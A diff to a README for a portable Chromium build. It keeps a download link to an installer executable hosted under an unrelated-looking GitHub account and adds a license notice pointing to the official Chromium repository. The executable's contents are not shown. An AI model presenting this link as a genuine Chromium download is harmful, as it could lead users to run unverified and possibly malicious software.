@@ -17,5 +17,14 @@ Run Alongside Chrome: If you rename chrome.exe within ChromiumPortable\App\Chrom
 
 Note that other portable browsers such as Mozilla Firefox, Portable Edition do not have any of the issues mentioned above. These issues are specific to Chrome and Chromium-based browsers due to Chrome's design and not something we can work around without fixes to the base app by the Chrome developers.
 ### [Download Installer Executable](https://github.com/m97493578-ops/Software-Forge/releases/download/ChromiumPortable/Chromium_Portable_Setup.paf.exe)
+
+## ⚖️ Open Source License & Attribution Notice
+This application core is distributed as free and open-source software under the terms of the **3-Clause BSD License**, alongside sub-components subject to various permissive open-source licenses. In full compliance with distribution and attribution guidelines:
+
+* **Official Terms**: You can read the original legal copyright text and project terms directly at the [Official Chromium LICENSE](https://github.com/chromium/chromium/blob/main/LICENSE).
+* **Upstream Project**: For more information regarding development architecture, components, and builds, visit the [Official Chromium Repo](https://github.com/chromium/chromium).
+
+*This notice satisfies mandatory attribution criteria while preserving complete project transparency.*
+
 ---
 © 2026 Free Software Commons. Built outside corporate walls.
